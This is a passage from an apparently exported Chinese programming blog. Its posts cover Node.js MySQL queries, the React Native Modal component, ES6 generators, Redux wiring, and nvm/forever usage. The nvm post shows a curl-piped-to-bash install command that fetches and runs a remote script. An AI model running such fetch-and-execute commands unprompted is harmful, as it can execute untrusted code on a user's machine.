&#125;);// 删除db.query( 'Delete From Student Where id = ?', [1], function(error, packet) &#123; if(error) throw error; // 删除成功 console.log('5. 删除成功'); &#125;);// 创建存储过程db.query('' + 'Create Procedure getStudentAllName() ' + 'Begin ' + ' Select s.name From Student As s;' + 'End ', function(error, packet) &#123; if(error) throw error; // 存储过程创建成功 console.log('6. 存储过程创建成功'); &#125;);// 调用存储过程db.query( 'Call getStudentAllName()', function(error, rows) &#123; if(error) throw error; // 存储过程输出的内容 console.log('7. 存储过程调用成功'); &#125;); 上面查询输出的结果： 12345678910111213141516[nodemon] starting `node server.js`1. 创建表成功2. 插入数据成功3. 查询成功[ &#123; \"id\": 1, \"name\": \"小东\", \"age\": 20, \"sex\": \"男\" &#125;]4. 更新成功5. 删除成功6. 存储过程创建成功7. 存储过程调用成功 pakcet 参数返回的信息，主要是操作了SQL语句后的一些信息 12345678910OkPacket &#123; fieldCount: 0, affectedRows: 0, insertId: 0, serverStatus: 2, warningCount: 0, message: '', protocol41: true, changedRows: 0&#125;, db-mysql API 查询db-mysql API 为我们做好了字符串转义，所以不用担心 SQL 注入。 123456789101112131415161718192021222324252627282930313233// 查询db.query().select(['id', 'user_login']).from('user') .where('user_login = ? And user_password = ?', ['abcde', '12345']) .execute((err, rows, columus) =&gt; &#123; if(err) return console.dir(err); console.dir(rows); &#125;);// 插入db.query().insert('user', ['user_login', 'user_password'], ['newbie', '123456']) .execute((err, row, columus) =&gt; &#123; if(err) return console.dir(err); console.dir(rows); &#125;);// 更新db.query().update('user').set(&#123; 'user_name': 'new name', 'user_age': 'new age', &#125;) .where('user_login = ?', ['newbie']) .execute((err, rows, columus) =&gt; &#123; if(err) return console.dir(err); console.dir(rows); &#125;);// 删除db.query().delete().from('user') .where('user_login = ?', ['newbie']) .execute((err, rows, columus) =&gt; &#123; if(err) return console.dir(err); console.dir(rows); &#125;); mysqljs/mysql除了 db-mysql 外，还有一个 mysqljs/mysql，使用基本差不多。具体参考：https://github.com/mysqljs/mysql 参考资料 https://www.npmjs.com/package/db-mysql","categories":[{"name":"Mysql","slug":"Mysql","permalink":"http://me.lizhooh.com/categories/Mysql/"}],"tags":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"数据库","slug":"数据库","permalink":"http://me.lizhooh.com/tags/数据库/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"MySQL","slug":"MySQL","permalink":"http://me.lizhooh.com/tags/MySQL/"}]},{"title":"React Native Modal 的使用","slug":"React Native/React Native Modal 的使用","date":"2017-02-25T01:29:11.000Z","updated":"2021-06-15T06:10:52.859Z","comments":true,"path":"/stories/2017/02/React Native/React Native Modal 的使用/","link":"","permalink":"http://me.lizhooh.com/stories/2017/02/React Native/React Native Modal 的使用/","excerpt":"Modal Modal组件可以用来覆盖包含React Native根视图的原生视图（如 UIViewController，Activity）","text":"Modal Modal组件可以用来覆盖包含React Native根视图的原生视图（如 UIViewController，Activity） 简单的使用12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455export default class App extends Component &#123; constructor(props) &#123; super(props); this.state = &#123; modalVisible: false, &#125;; &#125; render() &#123; return ( &lt;View style=&#123;styles.body&#125; &gt; &lt;View&gt; &lt;TouchableOpacity activeOpacity=&#123;0.8&#125; style=&#123;styles.button&#125; onPress=&#123;() =&gt; &#123; this.setState(&#123; modalVisible: true, &#125;); &#125; &#125; &gt; &lt;Text&gt;点我&lt;/Text&gt; &lt;/TouchableOpacity&gt; &lt;/View&gt; &lt;Modal animationType=&#123;\"fade\"&#125; transparent=&#123;true&#125; visible=&#123;this.state.modalVisible&#125; onRequestClose=&#123;() =&gt; undefined&#125; &gt; &lt;Text style=&#123;&#123; textAlign: 'center' &#125;&#125;&gt;Hide Modal&lt;/Text&gt; &lt;TouchableOpacity style=&#123;styles.modal&#125; activeOpacity=&#123;1&#125; onPress=&#123;() =&gt; &#123; this.setState(&#123; modalVisible: false, &#125;); &#125; &#125; &gt; &lt;/TouchableOpacity&gt; &lt;/Modal&gt; &lt;/View&gt; ); &#125;&#125; 属性 属性名 参数 说明 animationType &#39;slide&#39;从底部滑入 &#39;fade&#39;渐渐消失 &#39;none&#39;没有动画 动画过渡类型 onRequestClose function回调函数 在请求关闭时触发的事件，在 Android 上是必须属性 onShow function回调函数 打开是触发的事件 transparent true，false Model 背景是否透明，不能通过 style 设置它的背景 visible true，false Model 是否显示 ios onOrientationChange function回调函数 取向变化方向 ios supportedOrientations [&#39;portrait&#39;, &#39;portrait-upside-down&#39;, &#39;landscape&#39;, &#39;landscape-left&#39;, &#39;landscape-right&#39;]一个枚举数组 模态旋转方向 第三方组件React-Native-Simple-Modal 一个简单 Modal 组件 引入12npm install react-native-simple-modal --saveimport Modal from 'react-native-simple-modal'; 使用下面的都是默认的设置值 1234567891011121314151617181920212223242526272829&lt;Modal // 是否打开 open=&#123;false&#125; // 偏移量 offset=&#123;0&#125; // 透明层的背景颜色 overlayBackground=&#123;'rgba(0, 0, 0, 0.75)'&#125; // 动画持续时间 animationDuration=&#123;200&#125; // 动画伸展程度 animationTension=&#123;40&#125; // 打开的时候触发的事件 modalDidOpen=&#123;() =&gt; undefined&#125; // 关闭的时候触发的事件 modalDidClose=&#123;() =&gt; undefined&#125; // 点击透明层时是否关闭 closeOnTouchOutside=&#123;true&#125; // 容器的样式 containerStyle=&#123;&#123; justifyContent: 'center' &#125;&#125; // modal的样式 modalStyle=&#123;&#123; borderRadius: 2, margin: 20, padding: 10, backgroundColor: '#F5F5F5' &#125;&#125;&gt;&lt;/Modal&gt; 方法12345678910// 打开 modalmodalRef.open();// 关闭 modalmodalRef.close();// can be used to animate a translation of the modal along the Y-axis// useful when for example the modal has a text input and the modal needs to// move up so that it's not hidden behind the keyboardmodalRef.animateOffset(number); 示例 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778'use strict';import React, &#123; Component &#125; from 'react';import &#123; StyleSheet, Text, View, TouchableOpacity,&#125; from 'react-native';import Modal from 'react-native-simple-modal';export default class App extends Component &#123; constructor(props) &#123; super(props); this.state = &#123; open: false &#125;; &#125; render() &#123; return ( &lt;View style=&#123;&#123; flex: 1, justifyContent: 'center', alignItems: 'center' &#125;&#125; &gt; &lt;TouchableOpacity onPress=&#123;() =&gt; this.setState(&#123; open: true &#125;)&#125;&gt; &lt;Text&gt;Open modal&lt;/Text&gt; &lt;/TouchableOpacity&gt; &lt;Modal offset=&#123;this.state.offset&#125; open=&#123;this.state.open&#125; animationDuration=&#123;200&#125; animationTension=&#123;10&#125; modalDidOpen=&#123;() =&gt; console.log('modal did open')&#125; modalDidClose=&#123;() =&gt; this.setState(&#123; open: false &#125;)&#125; closeOnTouchOutside=&#123;true&#125; style=&#123;&#123; alignItems: 'center' &#125;&#125;&gt; &lt;View&gt; &lt;Text style=&#123;&#123; fontSize: 20, marginBottom: 10 &#125;&#125; &gt; Hello world! &lt;/Text&gt; &lt;TouchableOpacity style=&#123;&#123; margin: 5 &#125;&#125; onPress=&#123;() =&gt; this.setState(&#123; offset: -100 &#125;)&#125;&gt; &lt;Text&gt;Move modal up&lt;/Text&gt; &lt;/TouchableOpacity&gt; &lt;TouchableOpacity style=&#123;&#123; margin: 5 &#125;&#125; onPress=&#123;() =&gt; this.setState(&#123; offset: 0 &#125;)&#125;&gt; &lt;Text&gt;Reset modal position&lt;/Text&gt; &lt;/TouchableOpacity&gt; &lt;TouchableOpacity style=&#123;&#123; margin: 5 &#125;&#125; onPress=&#123;() =&gt; this.setState(&#123; offset: 100 &#125;)&#125;&gt; &lt;Text&gt;Move modal down&lt;/Text&gt; &lt;/TouchableOpacity&gt; &lt;TouchableOpacity style=&#123;&#123; margin: 5 &#125;&#125; onPress=&#123;() =&gt; this.setState(&#123; open: false &#125;)&#125;&gt; &lt;Text&gt;Close modal&lt;/Text&gt; &lt;/TouchableOpacity&gt; &lt;/View&gt; &lt;/Modal&gt; &lt;/View&gt; ); &#125;&#125; 参考 https://github.com/bodyflex/react-native-simple-modal","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"ES6 初识 Generator","slug":"ECMAScript/ES6 初识 Generator","date":"2017-02-24T06:29:08.000Z","updated":"2021-06-15T06:10:52.811Z","comments":true,"path":"/stories/2017/02/ECMAScript/ES6 初识 Generator/","link":"","permalink":"http://me.lizhooh.com/stories/2017/02/ECMAScript/ES6 初识 Generator/","excerpt":"GeneratorGenerator 是 ES6 新增加的一个函数，叫生成器。它涉及了 ECMAScript 引擎运行底层的特性，可以实现一些无法想象的事情。","text":"GeneratorGenerator 是 ES6 新增加的一个函数，叫生成器。它涉及了 ECMAScript 引擎运行底层的特性，可以实现一些无法想象的事情。 比如说，要计算 Fn = Fn-1 + Fn-2 (n &gt;= 3) 使用普通的方法可能是这样： 123456789const fibonacci = [0, 1];const n = 10;for(let i = 2; i &lt; n - 1; i++) &#123; fibonacci.push(fibonacci[i - 1] + fibonacci[i - 2]);&#125;console.log(fibonacci.toString());// 0, 1, 1, 2, 3, 5, 8, 13, 21 使用 Generator 生成器来实现： 12345678910111213141516171819function *fibo() &#123; let [a, b] = [0, 1]; yield a; yield b; while(true) &#123; [a, b] = [b, a + b]; yield b; &#125;&#125;const f = fibo();for(let i = 0; i&lt; 10; i++) &#123; console.log(f.next().value); // 0, 1, 1, 2, 3, 5, 8, 13, 21&#125; 基本概念Generator函数 与普通函数的区别在于函数名前是否带有 *，Generator函数并不是函数，直接调用只会生成一个生成器。用 yield 来指定运行到停止的位置，下次从这一个位置运行到下一个位置。所以其实提供了一种可以暂停执行的函数。yield 语句就是暂停标志。 上面通过 Generator 函数 fibo 来生成一个生成器：f 生成器需要调用 next() 来推进，比如：第一次调用 f.next() 会返回 { value: 0, done: false }，从函数开头，运行到 yield a 处暂停。第二次调用 f.next() 会返回 { value: 1, done: false }，从 yield a 后，运行到 yield b 处暂停。第三次调用 f.next() 会返回 { value: 1, done: false }，从 yield b 后，运行到新的 yield b 处暂停。第四次调用 f.next() 会返回 { value: 2, done: false }，从 while yield b 后，运行到 下一个循环的 yield b 处暂停。 如果发现之后没有 yield 调用，就会返回 done 为 true. 深入理解 yield 语句下面代码定义了一个 Generator 函数 helloWorldGenerator，它内部有两个 yield 语句 “hello” 和 “world”，即该函数有三个状态：hello，world 和 return 语句（结束执行）。 12345678910111213141516function* helloWorldGenerator() &#123; yield 'hello'; yield 'world'; return 'ending';&#125;var hw = helloWorldGenerator();hw.next()// &#123; value: 'hello', done: false &#125;hw.next()// &#123; value: 'world', done: false &#125;hw.next()// &#123; value: 'ending', done: true &#125;hw.next()// &#123; value: undefined, done: true &#125; 遍历器对象的 next 方法的运行逻辑如下： 遇到 yield 语句，就暂停执行后面的操作，并将紧跟在 yield 后面的那个表达式的值，作为返回的对象的 value 属性值。 下一次调用 next 方法时，再继续往下执行，直到遇到下一个 yield 语句。 如果没有再遇到新的 yield 语句，就一直运行到函数结束，直到 return 语句为止，并将 return 语句后面的表达式的值，作为返回的对象的 value 属性值。 如果该函数没有 return 语句，则返回的对象的 value 属性值为 undefined。 yield 语句与 return 语句既有相似之处，也有区别：区别在于每次遇到 yield，函数暂停执行，下一次再从该位置继续向后执行，而 return 语句不具备位置记忆的功能。 注意： yield 不能在普通函数里使用，不然会报错。 yield 语句如果用在一个表达式之中，必须放在圆括号里面。 yield 语句用作函数参数或赋值表达式的右边，可以不加括号。 yield 句本身没有返回值，或者说总是返回 undefined next 方法可以带一个参数，该参数就会被当作上一个 yield 语句的返回值。 12345678910111213141516function *gen(x) &#123; const y = yield x + 1; console.log('y =', y);&#125;const g = gen(3);g.next();// =&gt; &#123; value: 4, done: false &#125;// g.next(); =&gt; y is undefinedg.next(2);// y = 2;g.next(4);// 没有输出，之前生成器已经结束了，之后怎么 next，都是没有输出效果的。 next方法yield 句本身没有返回值，或者说总是返回 undefined。next 方法可以带一个参数，该参数就会被当作上一个 yield 语句的返回值。 1234567891011121314function* f() &#123; for(var i = 0; true; i++) &#123; var reset = yield i; if(reset) &#123; i = -1; &#125; &#125;&#125;var g = f();g.next() // &#123; value: 0, done: false &#125;g.next() // &#123; value: 1, done: false &#125;g.next(true) // &#123; value: 0, done: false &#125; 上面代码先定义了一个可以无限运行的 Generator 函数 f，如果 next 方法没有参数，每次运行到 yield 语句，变量 reset 的值总是 undefined。当 next 方法带一个参数true时，变量 reset 就被重置为这个参数（即true），因此i会等于-1，下一轮循环就会从-1开始递增。 注意：由于 next 方法的参数表示上一个 yield 语句的返回值，所以第一次使用 next 方法时，不能带有参数。 for … of 循环for…of 循环可以自动遍历 Generator 函数时生成的 Iterator 对象，且此时不再需要调用 next 方法。 123456789101112function *foo() &#123; yield 1; yield 2; yield 3; yield 4; yield 5; return 6;&#125;for (let v of foo()) &#123; console.log(v); // 1 2 3 4 5&#125; throw()Generator 函数返回的遍历器对象，都有一个 throw 方法，可以在函数体外抛出错误，然后在 Generator 函数体内捕获。throw 方法可以接受一个参数，该参数会被 catch 语句接收，建议抛出 Error 对象的实例。 12345678910111213var g = function* () &#123; try &#123; yield; &#125; catch (e) &#123; console.log(e); &#125;&#125;;var i = g();i.next();i.throw(new Error('出错了！'));// Error: 出错了！(…) 注意： 一旦 Generator 执行过程中抛出错误，且没有被内部捕获，就不会再执行下去了。如果此后还调用 next 方法，将返回一个 value 属性等于 undefined、done 属性等于 true 的对象，即 JavaScript 引擎认为这个 Generator 已经运行结束了。 return()Generator 函数返回的遍历器对象，还有一个 return 方法，可以返回给定的值，并且终结遍历 Generator 函数。 1234567891011function* gen() &#123; yield 1; yield 2; yield 3;&#125;var g = gen();g.next() // &#123; value: 1, done: false &#125;g.return('foo') // &#123; value: \"foo\", done: true &#125;g.next() // &#123; value: undefined, done: true &#125; yield * 语句如果在 Generator 函数内部，调用另一个 Generator 函数，默认情况下是没有效果的。 12345678910111213141516function* foo() &#123; yield 'a'; yield 'b';&#125;function* bar() &#123; yield 'x'; foo(); yield 'y';&#125;for (let v of bar())&#123; console.log(v);&#125;// \"x\"// \"y\" 但是使用yield*就可以让它有效果。 123456789101112131415161718192021function* foo() &#123; yield 'a'; yield 'b';&#125;function* bar() &#123; yield 'x'; yield* foo(); yield 'y';&#125;// 等同于/*function* bar() &#123; yield 'x'; yield 'a'; yield 'b'; yield 'y';&#125;*/ 使用 yield 而不使用 yield* 12345678910111213141516function* foo() &#123; yield 'a'; yield 'b';&#125;function* bar() &#123; yield 'x'; yield foo(); yield 'y';&#125;cosnt b = bar();b.next(); // &#123; value: 'x', done: false &#125;b.next(); // 返回一个生成器 foo()b.next(); // &#123; value: 'y', done: false &#125; 如果yield*后面跟着一个数组，由于数组原生支持遍历器，因此就会遍历数组成员。实际上，任何数据结构只要有Iterator接口，就可以被yield*遍历。 包括字符串，数组，对象之类。 123456789101112131415function* gen()&#123; yield* ['a', 'b', 'c']; yield* 'hello';&#125;const g = gen();// 开始第一个 yield*console.log(g.next()); // &#123; value: 'a', done: false &#125;console.log(g.next()); // &#123; value: 'b', done: false &#125;console.log(g.next()); // &#123; value: 'c', done: false &#125;// 开始第二个 yield*console.log(g.next()); // &#123; value: 'h', done: false &#125;console.log(g.next()); // &#123; value: 'e', done: false &#125;console.log(g.next()); // &#123; value: 'l', done: false &#125; yield* 命令可以很方便地取出嵌套数组的所有成员 1234567891011121314151617function* iterTree(tree) &#123; if (Array.isArray(tree)) &#123; for(let i=0; i &lt; tree.length; i++) &#123; yield* iterTree(tree[i]); &#125; &#125; else &#123; yield tree; &#125;&#125;const tree = [ 'a', ['b', 'c'], ['d', 'e'] ];for(let x of iterTree(tree)) &#123; console.log(x);&#125;// a, b, c, d, e Generator函数的 thisGenerator 函数总是返回一个遍历器，ES6 规定这个遍历器是 Generator 函数的实例，也继承了 Generator 函数的 prototype 对象上的方法。Generator 函数不能跟 new 命令一起用，会报错。Generator 函数内使用 this 添加属性会无效。 12345678910111213function* g() &#123; this.text = 'abc';&#125;g.prototype.hello = function () &#123; return 'hi!';&#125;;let obj = g();obj instanceof g // trueobj.hello() // 'hi!'obj.text; // undefined Generator 与状态机Generator 是实现状态机的最佳结构。比如，下面的 clock 函数就是一个状态机。 123456789101112131415161718192021let ticking = true;const clock = function() &#123; if (ticking) console.log('Tick!'); else console.log('Tock!'); ticking = !ticking;&#125;// 使用 Generatorconst clock = function*() &#123; while (true) &#123; // 奇数执行这里 console.log('Tick!'); yield; // 偶数执行这里 console.log('Tock!'); yield; &#125;&#125;; 参考资料 http://es6.ruanyifeng.com/#docs/generator","categories":[{"name":"ES6","slug":"ES6","permalink":"http://me.lizhooh.com/categories/ES6/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"ES6(ES2015)","slug":"ES6-ES2015","permalink":"http://me.lizhooh.com/tags/ES6-ES2015/"}]},{"title":"Redux 与 React 的连接","slug":"Redux/Redux 与 React 的连接","date":"2017-02-23T05:54:54.000Z","updated":"2021-06-15T06:10:52.891Z","comments":true,"path":"/stories/2017/02/Redux/Redux 与 React 的连接/","link":"","permalink":"http://me.lizhooh.com/stories/2017/02/Redux/Redux 与 React 的连接/","excerpt":"手动连接Redux 与 React 连接有手动连接的方式。 一般来说有以下几个步骤： 编写 React 组件 编写 Redux 的 reducer，action，Store 将 state 和 dispatch 连接到 React 组件里","text":"手动连接Redux 与 React 连接有手动连接的方式。 一般来说有以下几个步骤： 编写 React 组件 编写 Redux 的 reducer，action，Store 将 state 和 dispatch 连接到 React 组件里 例如： 123456789101112131415// ...import &#123; createStore &#125; from 'redux';const Store = createStore(_reducer);function render() &#123; ReactDOM.render( &lt;Counter value=&#123;Store.getState()&#125; onClick=&#123;() =&gt; Store.dispatch(&#123; type: 'Insert' &#125;)&#125; /&gt; , Root );&#125;; render();Store.subsrcibe(render); 手动连接带来的问题手动连接的缺点还是比较明显的： 无法直接给里面的组件传递 state 和方法。 任意 state 的变化都会导致整个组件树的重新渲染，没有优化性能。 自动连接Redux 与 React 连接有自动连接，使用的是 react-redux。相比手动连接，它内置了性能优化的功能，帮助程序减少不必要的性能消耗。 先是安装 react-redux 1npm install --save react-redux redux 连接步骤下面实现一个数据的双向绑定。 连接步骤主要分以下几步： 编写 component，组件是无状态的，只使用 props 编写 action 编写 reducer 创建 Store 连接 redux 到组件上 最后，把新的组件放在&lt;Provider&gt;里面 编写 component，组件是无状态的，只使用 props myComponent.js 123456const myComponent = (&#123;text, name, onChange&#125;) =&gt; ( &lt;div className=\"index\"&gt; &lt;p&gt;&#123;text&#125;&lt;/p&gt; &lt;input defaultValue=&#123;name&#125; onChange=&#123;onChange&#125; /&gt; &lt;/div&gt;); 编写 action action.js 1234const updateText = (e) =&gt; (&#123; type: 'change', payload: e.target.value&#125;); 编写 reducer reducer.js 1234567891011121314function reducer(state = &#123; text: '你好，访问者', name: '访问者'&#125;, action) &#123; switch (action.type) &#123; case 'change': return &#123; name: action.payload, text: '你好，' + action.payload &#125;; default: return state; &#125;&#125; 创建 Store main.js 1234567import &#123; createStore &#125; from 'redux'import &#123; Provider &#125; from 'react-redux'import reducer from './reducer';// Storeconst store = createStore(reducer); 连接 redux 到组件上 App.js 1234567891011121314import &#123; connect &#125; from 'react-redux';// connect 是 react-redux 用来自动连接的函数，它有几种的使用方式。（后面介绍）// 返回一个新的组件。export default connect( state =&gt; (&#123; // 让 store 中的 state 与 组件的 props 连接在一起 text: state.text, name: state.name &#125;), dispatch =&gt; (&#123; // updateText 是一个 action 函数，事件与 dispatch 连接在一起 onChange: (event) =&gt; dispatch(updateText(event)), &#125;),)(myComponent); // 把 myComponent 连接成一个新的组件。 最后，把新的组件放在&lt;Provider&gt;里面例如： 1234567891011121314151617import React from 'react';import ReactDOM from 'react-dom';import &#123; createStore &#125; from 'redux'import &#123; Provider &#125; from 'react-redux'import App from './App'; // connect 所在文件import reducer from './reducer'; // reducer 所在文件// Storeconst store = createStore(reducer);ReactDOM.render( &lt;Provider store=&#123;store&#125;&gt; &lt;App /&gt; &lt;/Provider&gt; , document.getElementById('app'))); react-redux 与 react-router 结合如果你想，使用react-router，那就把&lt;Router&gt;放在&lt;Provider&gt;里面，其他不变。 12345&lt;Provider store=&#123;store&#125;&gt; &lt;Router history=&#123;hashHistory&#125;&gt; &lt;Router path=\"/\" component=&#123;App&#125; /&gt; &lt;/Router&gt;&lt;/Provider&gt; 关于 connect 使用的几种方式connect 支持多种写法，下面列举几种常用的写法，都是接收 2 个参数state function, dispatch function 第一种写法，自动绑定 dispatchconnect 的第一个参数是参数为state的函数，该函数返回的对象Object将被合并到组件的props中也就是说： 12345// 把 text, name 合并到组件的 props 里，这样就可以使用 this.props.text, this.props.name&#123; text: state.text, // =&gt; this.props.text name: state.name, // =&gt; this.props.name&#125; connect 的第二个参数是多个action创建函数组成的对象，该对象也会被合并到组件的props中也就是说： 1234// 把 text, name 合并到组件的 props 里，这样就可以使用 this.props.onChange,&#123; onChange: updateText,&#125; 接下来 connect 就会自动的帮你绑定使用dispatch函数。 123456789export default connect( state =&gt; (&#123; text: state.text, name: state.name &#125;), &#123; onChange: updateText, &#125;)(myComponent); 第二种写法，手动绑定 dispatch第二种写法和第一种差不多，不过你需要自己去绑定dispatchconnect 的第二个参数是参数为dispatch的函数，返回的对象会合并到组件的props中 123456789export default connect( state =&gt; (&#123; text: state.text, name: state.name &#125;), dispatch =&gt; (&#123; onChange: (event) =&gt; dispatch(updateText(event)), &#125;),)(myComponent); 第三种写法， 使用 bindActionCreators 来自动绑定第三种写法与第二种差不多，但是使用了redux的bindActionCreators方法来自动绑定dispatchbindActionCreators 的第一个参数为多个action创建函数组成的对象，第二个参数为dispatch 12345678import &#123; bindActionCreators &#125; from 'redux';export default connect( state =&gt; (&#123; text: state.text, name: state.name &#125;), dispatch =&gt; bindActionCreators(&#123; onChange &#125;, dispatch),)(myComponent); 第四种写法，手动发起 dispatchconnect 的第一个参数不变，第二个参数为空。这时候，connect 会给组件传接一个 dispatch props，你需要自己在组件内使用 dispatch 12345678910111213141516171819export default connect( state =&gt; (&#123; text: state.text, name: state.name &#125;))(myComponent);// 组件改为：const myComponent = (&#123;text, name, dispatch&#125;) =&gt; ( &lt;div className=\"index\"&gt; &lt;p&gt;&#123;text&#125;&lt;/p&gt; &lt;input defaultValue=&#123;name&#125; onChange=&#123;event =&gt; &#123; dispatch(updateText(event)); &#125;&#125; /&gt; &lt;/div&gt;); 第五种写法，使用装饰器使用装饰器（ES7 特性），将connect写在组件类的上面。这样connect就会去装饰组件类，去修改它的props 123456789101112@connect( state =&gt; (&#123; text: state.text, name: state.name &#125;), &#123; onChange: updateText, &#125;)default class myComponent extends Component &#123; // ...&#125; 最后还有很多的写法，比如第五种与第二种结合。比较推荐的是：第一种，第二种，第四种写法。 推荐文件目录结构根据多次探索，终于找到比较好的文件目录结构： 123456789redux │── actions │ │── index.js │ │── reducers │ │── index.js │ │── store.js │── types.js 说明： store 的创建在 store.js 里编写： 12345678910111213141516171819import React from 'react';import thunk from 'redux-thunk';import &#123; createStore, combineReducers, compose, applyMiddleware,&#125; from 'redux';import * as reducers from './reducers';// Storeexport default store = createStore( combineReducers(&#123; ...reducers &#125;), compose( applyMiddleware(thunk), ),); 所有的 action.type 都在types.js里定义，这样方便集中管理，对于需要网络请求，多种 action.type 的，可以定义一个扩展类型函数： 1234567891011121314/*** 扩展状态类型* @returns&#123;Object&#125;*/const extendState = (obj) =&gt; &#123; Object.keys(obj).forEach(key =&gt; &#123; obj[key + '_in'] = obj[key] + '_in'; // 进行中 obj[key + '_fail'] = obj[key] + '_fail'; // 失败了 obj[key + '_success'] = obj[key] + '_success'; // 成功了 obj[key + '_success'] = obj[key] + '_other'; // 其他情况 obj[key + '_complete'] = obj[key] + '_complete'; // 完成了 &#125;); return obj;&#125; 所有的 reducer 都在 reducers 目录下定义，index.js负责汇总树枝。类似的有： 1234567891011const root_init_state = &#123; // ...&#125;export default (state = root_init_state, action) =&gt; &#123; switch (action.type) &#123; default: return state &#125;&#125;export &#123; default as login_sign &#125; from './login-sign'; 所有的 action 都在 actions 目录下定义，index.js负责汇总树枝。类似的有： 1234import * as _loginSignActions from './login-sign';// 登录注册 actionsexport const loginSignActions = _loginSignActions; 这样做的好处就是方便集中管理。在以前，reducer 与 action 都依附在 components、view、page 下，导致找起来特别不好找，特别是目录嵌入很深的时候。","categories":[{"name":"Redux","slug":"Redux","permalink":"http://me.lizhooh.com/categories/Redux/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Redux","slug":"Redux","permalink":"http://me.lizhooh.com/tags/Redux/"}]},{"title":"Nodejs 版本管理（nvm）和守护进程（forever）","slug":"Nodejs/Nodejs 版本管理（nvm）和守护进程（forever）","date":"2017-02-21T12:59:39.000Z","updated":"2021-06-15T06:10:52.840Z","comments":true,"path":"/stories/2017/02/Nodejs/Nodejs 版本管理（nvm）和守护进程（forever）/","link":"","permalink":"http://me.lizhooh.com/stories/2017/02/Nodejs/Nodejs 版本管理（nvm）和守护进程（forever）/","excerpt":"nvmnvm 是一个 Nodejs 的版本管理工具，它可以帮助我们管理 Nodejs 的版本或者是安装 Nodejs。它是一个很好的工具，当你安装 nodejs 时，它会自动检测你的 CPU 架构，从而安装对应平台的 Nodejs。","text":"nvmnvm 是一个 Nodejs 的版本管理工具，它可以帮助我们管理 Nodejs 的版本或者是安装 Nodejs。它是一个很好的工具，当你安装 nodejs 时，它会自动检测你的 CPU 架构，从而安装对应平台的 Nodejs。 Linux 或 Mac 上，安装 nvm （nvm 的版本，查看 github） 1curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.33.0/install.sh | bash 激活 nvm（必须） 1. ~/.nvm/nvm.sh 设定 node 镜像源为淘宝的源（速度更快） 1export NVM_NODEJS_ORG_MIRROR=https://npm.taobao.org/mirrors/node npm 源修改源地址为淘宝 NPM 镜像 1npm config set registry http://registry.npm.taobao.org/ 修改源地址为官方源 1npm config set registry https://registry.npmjs.org/ node 升级查看可用版本 1nvm ls-remote 安装指定版本 1nvm install 7.0.0 验证升级结果 12node -vnpm -v forever在 Linux 中我们可以使用这种简单的方式让 node.js 在后台运行 1nohup node app.js &amp; forever 可以让我们做得更好，并且可以跨平台的在 windows 和 Linux 下都能运行 安装 1npm install forever -g 一些使用命令： 1234567891011121314# 启动守护进程forever start app.js# 关闭守护进程forever stop app.js# 重启守护进程forever restart app.js# 如果需要记录输出日志和错误：forever start -l forever.log -o out.log -e err.log app.js# 查看正在运行的程序：forever list","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"理解 Redux","slug":"Redux/Redux 理解","date":"2017-02-20T04:08:36.000Z","updated":"2021-06-15T06:10:52.891Z","comments":true,"path":"/stories/2017/02/Redux/Redux 理解/","link":"","permalink":"http://me.lizhooh.com/stories/2017/02/Redux/Redux 理解/","excerpt":"ReduxRedux 是一个 Javascript 状态容器，提供可预测的状态管理。Redux 可以用三条基本原则来描述： 单一数据源。 state 只读。 使用纯函数（函数式编程）来执行修改。","text":"ReduxRedux 是一个 Javascript 状态容器，提供可预测的状态管理。Redux 可以用三条基本原则来描述： 单一数据源。 state 只读。 使用纯函数（函数式编程）来执行修改。 单一数据源单一数据源是指应用的 state 被存储在一棵对象树中，并且这个对象树只存在于唯一一个 store。 state 只读state 只读并不代表，无法改变 state。”只读”指的是不允许直接对 state 这个变量重写赋值，但是可以通过 action 和 reducer 返回一个新的 state。 使用纯函数（函数式编程）来执行修改使用纯函数（函数式编程）来执行修改是指更新 state 的 reducer 只是一些纯函数，它接收先前的 state 和 action，并返回新的 state。 Redux 名词与关系action，reducer，state，store 是 Redux 中一些重要的基本概念。 actionaction 本质上是 Javascript 普通对象。我们约定，action 内使用一个字符串类型的 type 字段来表示将要执行的动作。而除了 type 外，action 对象的结构完全是由你自己而定。 1&#123; type: 'DELETE_ARTICLE' &#125; reducerreducer 是个形式为(state, action) =&gt; state的纯函数，描述了 action 如何把 state 转变成下一个 state。state 的形式完全取决于你，唯一的要点是：当 state 变化时需要返回全新的对象，而不是修改传入参数。 12345678910111213141516const _reducer = (state = 0, action) =&gt; &#123; const than = &#123; 'INCREMENT': () =&gt; state + 1, 'DECREMENT': () =&gt; state - 1, &#125;[action.type]; return typeof than === 'function' ? than() : state;&#125;;// 或者(效果一样，推荐第一种)const __reducer = (state = 0, action) =&gt; &#123; switch(action.type) &#123; case 'INCREMENT': return state + 1; case 'DECREMENT': return state - 1; default: return false; &#125;&#125;; reducer 